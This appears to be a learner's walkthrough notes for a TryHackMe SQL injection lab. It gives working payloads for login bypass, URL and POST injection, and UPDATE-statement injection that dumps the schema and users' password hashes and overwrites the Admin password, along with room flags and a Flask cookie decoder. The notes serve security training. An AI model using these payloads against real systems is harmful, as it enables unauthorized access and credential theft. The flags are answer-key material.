#SQLi #FreeRoom 
https://tryhackme.com/r/room/sqlilab

This room is meant as an introduction to SQL injection and demonstrates various SQL injection attacks. It is not meant as a way to learn the SQL language itself. Some previous knowledge of the SQL language is highly recommended.

All the scripts mentioned in the tasks can be viewed and downloaded by visiting the "Downloads" page in the top-left corner on the landing page or visiting [http://10.10.x.x:5000/downloads/]

## intro SQL injection

Applications will often need dynamic SQL queries to be able to display content based on different conditions set by the user. To allow for dynamic SQL queries, developers often concatenate user input directly into the SQL statement. Without checks on the received input, string concatenation becomes the most common mistake that leads to SQL injection vulnerability. Without input sanitization, the user can make the database interpret the user input as a SQL statement instead of as data. In other words, the attacker must have access to a parameter that they can control, which goes into the SQL statement. With control of a parameter, the attacker can inject a malicious query, which will be executed by the database. If the application does not sanitize the given input from the attacker-controlled parameter, the query will be vulnerable to SQL injection attack.

---

The following PHP code demonstrates a dynamic SQL query in a login from. The user and password variables from the POST request is concatenated directly into the SQL statement.

```php
$query = "SELECT * FROM users WHERE username='" + $_POST["user"] + "' AND password= '" + $_POST["password"]$ + '";"
```

If the attacker supplies the value` ' OR 1=1-- -` inside the name parameter, the query might return more than one user. Most applications will process the first user returned, meaning that the attacker can exploit this and log in as the first user the query returned. The double-dash (--) sequence is a comment indicator in SQL and causes the rest of the query to be commented out. In SQL, a string is enclosed within either a single quote (') or a double quote ("). The single quote (') in the input is used to close the string literal. If the attacker enters ' OR 1=1--: in the name parameter and leaves the password blank, the query above will result in the following SQL statement.

```php
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = ''
```

If the database executes the SQL statement above, all the users in the users table are returned. Consequently, the attacker bypasses the application's authentication mechanism and is logged in as the first user returned by the query.

### SQL injection: input box (non string)

When a user logs in, the application performs the following query:

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=10 AND password = 'ce5ca67...'
```

Since there is no input sanitization, it is possible to bypass the login by using any True condition such as the one below as the ProfileID
```
# bypass login
1 or 1=1-- -

THM{dccea429d73d4a6b4f117ac64724f460}
```

### SQL Injection: input box string

This challenge uses the same query as in the previous challenge. However, the parameter expects a string instead of an integer, as can be seen here:

```
profileID='10'

# bypass login
1' or '1'='1'-- -

THM{356e9de6016b9ac34e02df99a5f755ba}
```

### SQL injection: url and POST 

```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='10' AND password='ce5ca67...'
```

But in this case, the malicious user input cannot be injected directly into the application via the login form because some client-side controls have been implemented:
```js
functionvalidateform() {
    var profileID = document.inputForm.profileID.value;
    var password = document.inputForm.password.value;

    if (/^[a-zA-Z0-9]*$/.test(profileID) == false || /^[a-zA-Z0-9]*$/.test(password) == false) {
alert("The input fields cannot contain special characters");
        return false;
    }
    if (profileID == null || password == null) {
alert("The input fields cannot be empty.");
        return false;
    }
}
```

The JavaScript code above requires that both the profileID and the password only contains characters between a-z, A-Z, and 0-9. Client-side controls are only there to improve the user experience and is in no way a security feature as the user has full control over the client and the data it submits. For example, a proxy tool such as Burp Suite can be used to bypass the client side JavaScript validation ([https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation](https://portswigger.net/support/using-burp-to-bypass-client-side-javascript-validation)).

### url manual SQL attack 

```
# browser 
http://10.10.20.95:5000/sesqli3/login?next=http%3A%2F%2F10.10.20.95%3A5000%2Fsesqli3%2Fhome
```

The login and the client-side validation can then easily be bypassed by going directly to this URL:

`http://10.10.52.39:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a`

The browser will automatically urlencode this for us. Urlencoding is needed since the HTTP protocol does not support all characters in the request. When urlencoded, the URL looks as follows:

`http://10.10.52.39:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a`

The %27 becomes the single quote (') character and %20 becomes a blank space.

```
THM{645eab5d34f81981f5705de54e8a9c36}
```
### SQL Injection: POST Injection

**When submitting the login form for this challenge, it uses the HTTP POST method. It is possible to either remove/disable the JavaScript validating the login form or submit a valid request and intercept it with a proxy tool such as Burp Suite and modify it:**

```
# burp suite intercept > change query > forward
profileID=1' or 1=1--&password=test

THM{727334fd0f0ea1b836a8d443f09dc8eb}

```

## SQL injection: update attack

 If a SQL injection occurs on an UPDATE statement, the damage can be much more severe as it allows one to change records within the database. In the employee management application, there is an edit profile page as depicted in the following figure.
```
 Edit Admin's Profile Info
 Nick Name: 
 Email: 
 Password:
 [ Change ]
```

This edit page allows the employees to update their information, but they do not have access to all the available fields, and the user can only change their information. If the form is vulnerable to SQL injection, an attacker can bypass the implemented logic and update fields they are not supposed to, or for other users.

We will now enumerate the database via the UPDATE statement on the profile page. We will assume we have no prior knowledge of the database. By looking at the web page's source code, we can identify potential column names by looking at the name attribute. The columns don't necessarily need to be named this, but there is a good chance of it, and column names such as "email" and "password" are not uncommon and can easily be guessed.

- check source code for `placeholder` , `id`, `name` tags
```
nickName='test'
email='hacked'
```

The first test confirmed that the application is vulnerable and that we have the correct column names. If we had the wrong column names, then non of the fields would have been updated. Since both fields are updated after injecting the malicious payload, the original SQL statement likely looks something similar to the following code:
```sql
UPDATE <tableName> SET nickName='name', email='email' WHERE <condition>
```

With this knowledge, we can try to identify what database is in use. There are a few ways to do this, but the easiest way is to ask the database to identify itself. The following queries can be used to identify MySQL, MSSQL, Oracle, and SQLite:

```SQL
# MySQL & MSSQl
',nickname=@@version,email='

# Oracle
',nickName=(SELECT banner FROM V$VERSION),EMAIL='

# SQLite
',nickName=sqlite_version(),email'
```

Knowing what database we are dealing with makes it easier to understand how to construct our malicious queries. We can proceed to enumerate the database by extracting all the tables. In the code below, we perform a subquery to fetch all the tables from database and place them into the nickName field. The subquery is enclosed inside parantheses. The [group_concat()](https://sqlite.org/lang_aggfunc.html#groupconcat) function is used to dump all the tables simultaneously.

```sql
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and table_name NOT like 'sqlite_%'),email='

',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='
```

By knowing the names of the columns, we can extract the data we want from the database. 
- For example, the query below will extract profileID, name, and passwords from usertable. The subquery is using the [group_concat()] function to dump all the information simultaneously, and the `||` operator is "concatenate": it joins together the strings of its operands

```sql
# get the password
test',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='
```
After having dumped the data from the database, we can see that the password is hashed. This means that we will need to identify the correct hash type used if we want to update the password for a user. Using a hash identifier such as hash-identifier, we can identify the hash as SHA256:

update the password for Admin using cyberchef
```sql
', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -
```

TASK
- log into task 5
- `profileID: 10 `
- `password: toor `

```
test
hacked',nickName=sqlite_version(),email='

>> 3.22.0

test',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='

--------------
CREATE TABLE `usertable` ( `UID` integer primary key, `name` varchar(30) NOT NULL, `profileID` varchar(20) DEFAULT NULL, `salary` int(9) DEFAULT NULL, `passportNr` varchar(20) DEFAULT NULL, `email` varchar(300) DEFAULT NULL, `nickName` varchar(300) DEFAULT NULL, `password` varchar(300) DEFAULT NULL )
-------------

test',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='

------------
10,Francois,ce5ca673d13b36118d54a7cf13aeb0ca012383bf771e713421b4d1fd841f539a:,11,Michandre,05842ffb6dc90bef3543dd85ee50dd302f3d1f163de1a76eee073ee97d851937:,12,Colette,c69d171e761fe56711e908515def631856c665dc234a0aa404b32c73bdbc81ac:,13,Phillip,b6efdfb0e20a34908c092725db15ae0c3666b3cea558fa74e0667bd91a10a0d3:,14,Ivan,be042a70c99d1c438cdcbd479b955e4fba33faf4f8c494239257e4248bbcf4ff:,99,Admin,6ef110b045cbaa212258f7e5f08ed22216147594464427585871bfab9753ba25:
-----------

-- cyberchef
Password123  --> sha256 == 008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601

test',UPDATE profileID SET nickName='hacker', email='email'

test', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -

What is the flag for SQL Injection 5: UPDATE Statement?

```

## decode cookie.py

```python
#!/usr/bin/python3
import zlib
import sys
import json
from itsdangerous import base64_decode

def decode(cookie):
    """
    Decode a Flask cookie

    https://www.kirsle.net/wizards/flask-session.cgi
    """
    try:
        compressed = False
        payload = cookie

        if payload.startswith('.'):
            compressed = True
            payload = payload[1:]

        data = payload.split(".")[0]

        data = base64_decode(data)
        if compressed:
            data = zlib.decompress(data)

        return data.decode("utf-8")
    except Exception as e:
        return f"[Decoding error: are you sure this was a Flask session cookie? {e}]"

cookie = sys.argv[1]
data = decode(cookie)
json_data = json.loads(data)
pretty = json.dumps(json_data, sort_keys=True, indent=4, separators=(",", ": "))
print(pretty)

```